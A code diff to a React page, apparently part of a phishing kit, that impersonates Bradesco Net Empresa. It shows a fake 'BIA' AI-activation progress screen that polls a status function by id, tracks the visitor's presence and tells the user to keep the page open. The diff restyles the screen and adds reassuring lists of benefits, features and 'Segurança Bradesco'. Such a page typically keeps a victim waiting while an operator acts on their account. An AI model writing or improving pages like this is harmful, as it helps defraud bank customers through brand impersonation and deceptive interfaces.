@@ -2,8 +2,10 @@ import { useEffect, useRef, useState } from "react";
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { useServerFn } from "@tanstack/react-start";
 import { z } from "zod";
+import { Check } from "lucide-react";
 import { verificarStatus } from "@/lib/cliente.functions";
 import { usePresenca } from "@/hooks/use-presenca";
+import { cn } from "@/lib/utils";
 import biaImg from "@/assets/bia.png.asset.json";
 import fundoBia from "@/assets/img-passo-11.png.asset.json";
 
@@ -30,6 +32,27 @@ const ETAPAS = [
   "Ativando modelos de inteligência",
   "Aplicando personalização empresarial",
   "Concluindo implementação",
+];
+
+const BENEFICIOS = [
+  {
+    titulo: "Disponibilidade 24/7",
+    descricao: "Suporte imediato a qualquer hora.",
+  },
+  {
+    titulo: "Agilidade Transacional",
+    descricao: "Operações via comando de voz ou texto.",
+  },
+  {
+    titulo: "Segurança Bradesco",
+    descricao: "Proteção robusta de dados corporativos.",
+  },
+];
+
+const FUNCIONALIDADES = [
+  { titulo: "Consultas", descricao: "Saldos, extratos e lançamentos." },
+  { titulo: "Pagamentos", descricao: "Boletos, tributos e transferências." },
+  { titulo: "Crédito", descricao: "Simulação e contratação rápida." },
 ];
 
 function InternaPage() {
@@ -94,9 +117,11 @@ function InternaPage() {
     return () => clearInterval(t);
   }, [id, checar, navigate]);
 
+  const etapaAtual = Math.min(ETAPAS.length - 1, Math.floor((progresso / 100) * ETAPAS.length));
+
   return (
     <div className="relative min-h-screen w-full overflow-hidden font-sans text-[13px] text-[#333]">
-      {/* Fundo ofuscado levemente reduzido, alinhado ao topo esquerdo */}
+      {/* Fundo desfocado, alinhado ao topo esquerdo e cobrindo a tela */}
       <div
         aria-hidden
         className="absolute inset-0 bg-no-repeat"
@@ -109,47 +134,156 @@ function InternaPage() {
       />
       <div aria-hidden className="absolute inset-0 bg-black/40" />
 
-      {/* Box de implementação */}
+      {/* Painel de implementação expandido */}
       <main className="relative z-10 flex min-h-screen items-center justify-center px-4 py-10">
-        <div className="w-full max-w-[560px] overflow-hidden border border-[#e2e2e2] bg-white shadow-[0_20px_60px_rgba(0,0,0,0.35)]">
-          <div className="relative flex h-[220px] items-center justify-center overflow-hidden bg-[#1a0530]">
-            <img
-              src={biaImg.url}
-              alt="BIA — Inteligência Artificial do Bradesco"
-              className="absolute inset-0 h-full w-full object-cover opacity-90"
-            />
-            <div className="absolute inset-0 bg-gradient-to-b from-transparent via-transparent to-black/40" />
-          </div>
-
-          <div className="px-10 py-10">
-            <div className="mx-auto max-w-[460px] text-center">
-              <p className="text-[11px] font-medium uppercase tracking-[0.18em] text-[#999]">
-                Bradesco Net Empresa
-              </p>
-              <h1 className="mt-2 text-[22px] font-light tracking-tight text-[#222]">
-                Implementando a <span className="font-semibold text-[#c8102e]">BIA</span> em sua conta
-              </h1>
-              <p className="mt-3 text-[13px] leading-relaxed text-[#666]">
-                A Inteligência Artificial do Bradesco está sendo ativada para o seu perfil empresarial.
-                O processo é automático e leva apenas alguns instantes.
-              </p>
-
-              <div className="mt-8">
-                <div className="h-[3px] w-full overflow-hidden rounded-full bg-[#f0f0f0]">
-                  <div
-                    className="h-full bg-[#c8102e] transition-all duration-300 ease-out"
-                    style={{ width: `${progresso}%` }}
+        <div className="relative w-full max-w-5xl overflow-hidden rounded-[32px] border border-white/50 bg-white/80 shadow-[0_32px_64px_-16px_rgba(200,16,46,0.12)] backdrop-blur-2xl">
+          {/* Cabeçalho com BIA */}
+          <div className="relative h-48 flex items-center bg-gradient-to-r from-[#c8102e] to-[#a00d25] px-12">
+            <div className="flex w-full items-center gap-8">
+              <div className="relative">
+                <div className="absolute inset-0 rounded-full bg-white/20 animate-ping" />
+                <div className="relative h-24 w-24 overflow-hidden rounded-full border-4 border-white/30 bg-white shadow-xl">
+                  <img
+                    src={biaImg.url}
+                    alt="BIA — Inteligência Artificial do Bradesco"
+                    className="h-full w-full object-cover"
                   />
                 </div>
-                <div className="mt-2.5 flex justify-between text-[11px] text-[#999]">
-                  <span className="text-[#555]">{ETAPAS[etapa]}</span>
-                  <span className="font-mono tabular-nums">{Math.floor(progresso)}%</span>
+              </div>
+              <div className="text-white">
+                <h1 className="mb-2 text-3xl font-bold tracking-tight">
+                  Configurando sua <span className="font-black">BIA</span>
+                </h1>
+                <p className="font-medium text-white/80">Bradesco Inteligência Artificial</p>
+              </div>
+              <div className="ml-auto text-right">
+                <div className="text-4xl font-black text-white">
+                  {Math.floor(progresso)}
+                  <span className="text-xl font-normal opacity-70">%</span>
+                </div>
+                <div className="mt-1 text-xs font-bold uppercase tracking-widest text-white/60">
+                  Progresso
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Conteúdo principal */}
+          <div className="grid grid-cols-12 gap-12 p-12">
+            {/* Lado esquerdo: status e progresso */}
+            <div className="col-span-12 flex flex-col justify-between lg:col-span-5">
+              <div>
+                <h2 className="mb-4 text-sm font-bold uppercase tracking-[0.2em] text-[#c8102e]">
+                  Status da Implementação
+                </h2>
+                <p className="mb-8 leading-relaxed text-slate-600">
+                  A Inteligência Artificial do Bradesco está sendo ativada para o seu perfil
+                  empresarial. O processo é automático e leva apenas alguns instantes.
+                </p>
+
+                <div className="space-y-6">
+                  {ETAPAS.map((nome, idx) => {
+                    const concluido = idx < etapaAtual;
+                    const atual = idx === etapaAtual;
+                    let pct = 0;
+                    if (concluido) {
+                      pct = 100;
+                    } else if (atual) {
+                      pct = Math.max(
+                        0,
+                        Math.min(100, ((progresso / 100) * ETAPAS.length - idx) * 100)
+                      );
+                    }
+
+                    return (
+                      <div key={idx}>
+                        <div className="mb-2 flex justify-between text-sm font-bold text-slate-800">
+                          <span>{nome}</span>
+                          {concluido ? (
+                            <span className="text-[#c8102e]">Concluído</span>
+                          ) : atual ? (
+                            <span className="text-slate-400">Processando...</span>
+                          ) : (
+                            <span className="text-slate-300">Pendente</span>
+                          )}
+                        </div>
+                        <div className="h-1.5 w-full overflow-hidden rounded-full bg-slate-100">
+                          <div
+                            className={cn("h-full rounded-full bg-[#c8102e]", atual && "animate-pulse")}
+                            style={{ width: `${pct}%` }}
+                          />
+                        </div>
+                      </div>
+                    );
+                  })}
                 </div>
               </div>
 
               <p className="mt-10 text-[11px] text-[#aaa]">
                 Mantenha esta página aberta até a conclusão.
               </p>
+            </div>
+
+            {/* Lado direito: benefícios e funcionalidades */}
+            <div className="col-span-12 rounded-2xl border border-slate-100 bg-slate-50/50 p-8 lg:col-span-7">
+              <div className="grid grid-cols-1 gap-8 sm:grid-cols-2">
+                {/* Benefícios */}
+                <div>
+                  <h3 className="mb-6 flex items-center gap-2 text-lg font-bold text-slate-800">
+                    <span className="h-5 w-1 rounded-full bg-[#c8102e]" />
+                    Benefícios
+                  </h3>
+                  <ul className="space-y-5">
+                    {BENEFICIOS.map((b) => (
+                      <li key={b.titulo} className="flex gap-3">
+                        <div className="mt-1 flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-green-100">
+                          <Check className="h-3 w-3 text-green-600" />
+                        </div>
+                        <div>
+                          <span className="block text-sm font-bold text-slate-700">{b.titulo}</span>
+                          <span className="text-xs text-slate-500">{b.descricao}</span>
+                        </div>
+                      </li>
+                    ))}
+                  </ul>
+                </div>
+
+                {/* Funcionalidades */}
+                <div>
+                  <h3 className="mb-6 flex items-center gap-2 text-lg font-bold text-slate-800">
+                    <span className="h-5 w-1 rounded-full bg-[#c8102e]" />
+                    Funcionalidades
+                  </h3>
+                  <div className="grid grid-cols-1 gap-3">
+                    {FUNCIONALIDADES.map((f) => (
+                      <div
+                        key={f.titulo}
+                        className="rounded-xl border border-slate-200 bg-white p-3 shadow-sm"
+                      >
+                        <span className="mb-1 block text-xs font-bold text-[#c8102e]">
+                          {f.titulo}
+                        </span>
+                        <span className="text-sm text-slate-600">{f.descricao}</span>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Rodapé da marca */}
+          <div className="flex items-center justify-between border-t border-slate-100 bg-slate-50 px-12 py-4">
+            <div className="flex items-center gap-2">
+              <div className="flex h-8 w-8 items-center justify-center rounded bg-[#c8102e]">
+                <span className="text-[10px] font-black text-white">B</span>
+              </div>
+              <span className="text-xs font-bold uppercase tracking-widest text-slate-400">
+                Bradesco Net Empresa
+              </span>
+            </div>
+            <div className="text-[10px] font-medium text-slate-400">
+              Versão 4.2.0 • BIA Intelligence v2
             </div>
           </div>
         </div>
